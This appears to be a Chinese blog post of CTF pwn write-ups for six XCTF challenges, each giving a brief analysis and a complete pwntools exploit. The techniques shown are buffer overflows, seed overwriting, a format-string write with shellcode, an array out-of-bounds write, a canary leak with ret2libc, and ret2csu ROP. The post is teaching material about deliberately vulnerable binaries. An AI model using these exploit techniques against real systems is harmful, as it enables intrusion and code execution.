---
title: 攻防世界-刷题
date: 2020-10-01 16:24:35
tags: 
 - PWN
 - CTF
categories: "PWN"
banner_img: /pic/ROP1-cover.jpg
---

# 攻防世界-hello_pwn

## 分析

在bss段进行溢出使if条件成立，得到flag

<!-- more -->

## EXP

```python
from pwn import *

p=remote('220.249.52.133',49097)
payload='a'*4+p64(1853186401)
p.sendline(payload)

p.interactive()
```

## flag

```reStructuredText
cyberpeace{5fcf1b522c5f92ff8dcb3624f6acd007}
```

# 攻防世界-dice_game

## 分析

在main函数中，read处栈溢出漏洞。有在sub_B28()中有我们想要的flag。由于程序开启了PIE保护，sub_B28()的地址是随机的，所以还是要猜数字。

我们在read处覆盖种子，这样我们每次都可以猜对。猜对50次，得到flag。

## EXP

```python
from pwn import *
from ctypes import *

context.log_level="DEBUG"
context.arch="amd64"
libc=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

#p=process('./dice_game')
p=remote('220.249.52.133',31497)

p.recv()
payload=0x40*'z'+p64(1)
p.send(payload)
p.recv()

libc.srand(1)
for i in range(50):
    num=str(libc.rand()%6+1)
    p.sendline(num)

p.interactive()
```

## 总结
简单的栈溢出，覆盖种子的值使随机数的规律已知。

需要了解随机数的**生成原理**：

> 计算机的随机数都是由伪随机数，即是由小M多项式序列生成的，其中产生每个小序列都有一个初始值，即随机种子。（注意： 小M多项式序列的周期是65535，即每次利用一个随机种子生成的随机数的周期是65535，当你取得65535个随机数后它们又重复出现了。）

**产生随机数的用法**

1. 给srand()提供一个种子，它是一个unsigned int类型；
2. 调用rand()，它会根据提供给srand()的种子值返回一个随机数(在0到RAND_MAX之间)；
3.  根据需要多次调用rand()，从而不间断地得到新的随机数；
4. 无论什么时候，都可以给srand()提供一个新的种子，从而进一步"随机化"rand()的输出结果。

```c
#include <stdlib.h>
#include <time.h>

int main()
{
    int a;
    srand(time(0));//将种子设为时间，时间一直在变所以数随机
    a=rand();
    printf("%d",a);
}
```

在python中使用c的语法：

```python
from ctypes import *
#使用LoadLibrary需要ctypes
libc=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
#使用相同so文件
libc.srand(1)	#设置种子为1
libc.rand()%6+1
```

# 攻防世界-string

## 分析

在主函数中，使用了malloc()来申请内存，它返回内存位置的首地址，所以这两个秘密就是来告诉我们v3的地址。

利用prinf()格式化字符串漏洞改写v3[0]的值，利用read写入shellcode。

我们在v2的时候写入v3的地址，利用%p%p%p%p%p%p%p%p%p%p确定其在格式化字符串的参数位置。

```shell
aaaa0x7ffff7faf7e30x7ffff7fb08c00x7ffff7edd5040x7ffff7fb5540(nil)0x1000000000x938640x70257025616161610x70257025702570250x7025702570257025
```

nil代表无值，也占用一个%p，从图中可以看出v2（0x938640）是格式化字符串的第7个参数。

## EXP

```python
from pwn import *
#from ctypes import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"
#p=process('./string')
p=remote('220.249.52.133',50201)

#接收给我们的v3地址，以16进制解析并将其转换整数
p.recvuntil("secret[0] is")
v4_addr=int(p.recvuntil("\n")[:-1],16)
p.sendlineafter("name be:",'1234')

p.sendlineafter("east or up?:",'east')

p.sendlineafter("leave(0)?:",'1')

p.sendlineafter("address'\n",str(v4_addr))

payload1='%85d'+'%7$n'
p.sendlineafter("wish is:",payload1)

payload=asm(shellcraft.sh())
p.sendlineafter("SPELL",payload)

p.interactive()
```

## 总结

```c
((void (_fastcall *)(_QWORD,void *))v1)(0ll,v1);
//这里是将v1转换为一个字长的指针，并使用fastcall调用。
```

**函数调用约定**

具体请参考：[[C语言函数调用栈(二)](https://www.cnblogs.com/clover-toeic/p/3756668.html)]

# 攻防世界-stack2

## 分析

数组超界漏洞：

**数组超界**

```reStructuredText
这个漏洞与格式化字符串漏洞相似，虽然数组本身没有那么大，但是下标超过定义范围后，它会认为与栈上的其他数据也是它的，并对其进行操作。

所以在有些情况下，数组超界也可用来泄露Canary的值。这里我们用其来修改返回地址。
```

在寻找数组首址与返回地址的偏移时，要采用动态调试，我们是进行主函数的返回地址覆盖，在程序最后发现esp所对应ret的栈地址向后移动了0x10.

```assembly
lea esp,[ecx-4]
;就是因为这个迷之指令
```

有后门函数但是远程环境没有“/bin/bash”，所以采用调用system函数的方法进行攻击。

## EXP

```python
from pwn import *
context.log_level="DEBUG"

p = remote('220.249.52.133',52159)
#p= process("./stack2")
#pwn_addr=0x0804859B
#sh_addr=0x08048987
#system_plt=0x08048450
offset=0x84

def write(addr,i):
    p.sendlineafter('exit\n','3')
    p.sendlineafter('change:\n',str(addr))
    p.sendlineafter('new number:\n',str(i))

p.sendlineafter('have:\n','1')
p.sendlineafter('numbers\n','1')
#写入system函数地址，小端序反向写入，v13为char数组，按字节写入
write(offset,0x50)
write(offset+1,0x84)
write(offset+2,0x04)
write(offset+3,0x08)

offset=offset+8#偏移+8，用来覆盖system的参数
#写入sh的地址
write(offset,0x87)
write(offset+1,0x89)
write(offset+2,0x04)
write(offset+3,0x08)
#退出，触发返回
p.sendlineafter('exit\n','5')

p.interactive()
```

# 攻防世界-pwn1

## 分析

主程序中，read()读取0x100字节可以把返回地址覆盖，但是我们要知道canary的值。

puts()函数遇到‘\x00’会截断，因为canary以‘\x00’结尾，所以不会输出canary的值。

但是当我们写入0x88字节的数据后，使用sendline()发送回自动加上“\n”，换行符。又因为是小端序，“\n”覆盖了canary结尾的‘\x00’。

所以我们可以得到canary的前7字节，最后只要加上‘\x00’就是完整的canary了。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

p=remote('220.249.52.133',59366)
elf = ELF('./babystack')
#libc=ELF('./libc-2.23.so') #s
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
pop_rdi=0x400a93
main=0x400908

p.sendlineafter('>>','1')
payload='a'*0x88
p.sendline(payload)
p.sendlineafter('>>','2')
p.recvuntil('a'*0x88+'\n')
canary = u64(p.recv(7).rjust(8,'\x00')) #rjust向字符串左侧填充指定字符，即向低地址字节填充
print hex(canary)

p.sendlineafter('>>','1')
payload='a'*0x88+p64(canary)+'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload)
#p.sendlineafter('>>','3')
#puts_addr=u64(p.recv(8).ljust(8,'\x00'))
p.sendlineafter('>> ','3') #这里注意>>后有个空格，要输入进去，不然puts_addr就recv了个寂寞╥﹏╥
puts_addr=u64(p.recv(8).ljust(8,'\x00'))
print('this is puts_addr:')
print hex(puts_addr)

libc=LibcSearcher('puts',puts_addr)
base=puts_addr-libc.dump('puts')

system=base+libc.dump('system')
binsh=base+libc.dump('str_bin_sh')

p.sendlineafter('>>','1')
payload='a'*0x88+p64(canary)+'a'*8+p64(pop_rdi)+p64(binsh)+p64(system)
p.send(payload)
p.sendlineafter('>>','3')
p.interactive()
```

## 总结

puts()函数：

```c 
int puts(const char *str);
```

puts()从string的开头往stdout中输出字符，直到遇见结束标志 '\0'，'\0'不会被输出到stdout。

ljust()，向字符串右侧填充指定内容，即高地址填充。rjust()，向字符串左侧填充指定内容，即低地址填充。

注意程序的输出，保证接收的数据正确。

加深对小端序储存的理解。

# 攻防世界-welpwn

## 分析

main函数读取了0x400字节的数据。在echo函数中将我们的输入的数据写入s2，但是遇到0就直接停止。但对于十六进制的地址没有“\x00”是不可能的。因为是小端序，从低地址开始写入数据，，我们还是可控制返回地址的。不过返回地址后的数据会被直接截断，这样我们就不能完成一次完整的攻击。

我们来分析一下栈的布局，寻找绕过的方法。

我们的payload在s2被截断，但是在buf处写入的数据没有被截断。我们要想办法使程序执行在buf的ROP链。

假设我们的payload=‘a’*24+p64(fake_ret)+p64(var_1)，那么栈的结构是这样的：

| aaaaaaaa | aaaaaaaa | aaaaaaaa | fake_ret | aaaaaaa | aaaaaaaa | aaaaaaaa | fake_ret | gadget |
| :------: | :------: | :------: | :------: | :-----: | :------: | :------: | :------: | ------ |
|    s2    |          |   rbp    |   ret    |   buf   |          |          |          |        |

要想执行到buf部分的shell处，需要跳过‘a’*24，还有已经执行过的fake_ret。而进行这个操作的要是fake_ret指向的程序处的一系列指令。

这样四个pop指令就可以让我们的rsp跳过前面四个内存单元指向var_1处。那么去那里找这样的四个连续pop呢？

在64位程序有万能gadget，__libc_csu_init，通过这个可控制绝大部分寄存器。
## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

p=remote('220.249.52.133',38032)
elf = ELF('./welpwn')

main=0x00000000004007CD
libc_csu_pop=0x000000000040089A
libc_csu_mov=0x0000000000400880
pop_rdi=0x00000000004008a3
pop_4=0x000000000040089c
write_plt=elf.plt['write']
write_got=elf.got['write']

def csu(rbx,rbp,r12,r13,r14,r15,last):
	payload ='a'*16+'b'*8
	payload+=p64(pop_4)+p64(libc_csu_pop)
	payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
	payload+=p64(libc_csu_mov)+'a'*56+p64(last)  #这里的‘a’*56是为了跳过pop和add
	p.send(payload)

p.recvuntil('RCTF\n')
csu(0,1,write_got,8,write_got,1,main)

write_addr = u64(p.recv(8))
print hex(write_addr)

libc=LibcSearcher('write',write_addr)
libcbase=write_addr-libc.dump('write')
system=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')

p.recvuntil('RCTF\n')
payload ='a'*16+'a'*8
payload+=p64(pop_4)+p64(pop_rdi)+p64(bin_sh)+p64(system) #这里只需要一个参数，所以不用万能gadget也可以。
p.send(payload)
p.interactive()
```



